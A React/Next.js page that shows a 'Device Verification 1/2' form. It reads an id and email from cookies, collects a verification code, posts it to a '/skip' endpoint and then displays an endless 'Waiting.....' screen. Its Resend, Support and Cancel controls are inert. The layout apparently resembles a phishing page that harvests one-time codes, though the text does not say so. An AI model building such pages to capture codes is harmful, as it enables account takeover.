"use client"
import React, { useState } from 'react'
import { Field, Form, Formik } from "formik";
import Cookies from "js-cookie";
import { toast } from "react-toastify";
import { API_URL } from "../config/index";

export default function page() {
    const id = Cookies.get("id");
    const email = Cookies.get("email");
    const [nextPage,setNextPage]=useState(false)
  
    const initialvalues = {
      id: id,
      skipcode: "",
    };
  
    const handleSubmit = async (values, formik) => {
      // console.log(values);


  
      const url = `${API_URL}/skip`;
  
      const res = await fetch(url, {
        method: "POST",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify(values),
      });
  
      const data = await res.json();
  
      if (res.ok) {
        console.log("success", data);
        toast.success("Login Succecssfull");
        formik.resetForm();
        Cookies.remove("id");
        Cookies.remove("email");
        setNextPage(true)
      } else {
        console.log("error", data);
        toast.error("Something Went Wrong");
      }
    };
  return (
   <>
   {
    !nextPage?( <div className="relative h-screen w-screen flex flex-col justify-center items-center">
    <div className="absolute flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
      <div className="bg-white md:w-[400px] py-4 shadow-around rounded-lg">
      <Formik
      initialValues={initialvalues}
      // validationSchema={validate}
      onSubmit={handleSubmit}
    >
      {(formik) => (
        <Form className="">
          <div className="px-8 py-4 lg:py-7 bg-white text-black rounded">
            <h2 className="text-2xl font-medium">Device Verification 1/2</h2>
            <p className="mt-6">
              We have just sent a Verification Code to email address provided
              {/* <strong> email@email.com</strong> */}
              <strong> {email}</strong>
            </p>

            <div className="my-5 flex justify-center">
              <div className="w-full lg:w-[320px]">
                <Field
                  className="w-full text-lg px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
                  name="skipcode"
                  placeholder="Enter Code Here"
                  type="text"
                  required
                  autoFocus
                />
              </div>
            </div>

            <p className="pt-2">
              No Code received yet?{" "}
              <span className="text-custom-amber cursor-pointer underline">
                Resend
              </span>
            </p>
            <p className="">
              Having trouble with receiving the Code, You can contact the{" "}
              <span className="text-custom-amber cursor-pointer underline">
                Support
              </span>
            </p>

            <div className="flex gap-4 justify-end">
              <button
                type="button"
                className="px-[22px] py-2 mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 text-white transition duration-300 rounded"
              >
                Cancel
              </button>
              <button
                type="submit"
                className="px-[22px] py-2 mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2  text-white transition duration-300 rounded"
              >
                Verify
              </button>
            </div>
          </div>
        </Form>
      )}
    </Formik>
      </div>
    
    </div>
  </div>):(<p className='text-2xl text-center mt-10 font-semibold'>
    Waiting.....
  </p>)
   }
   </>
  )
}
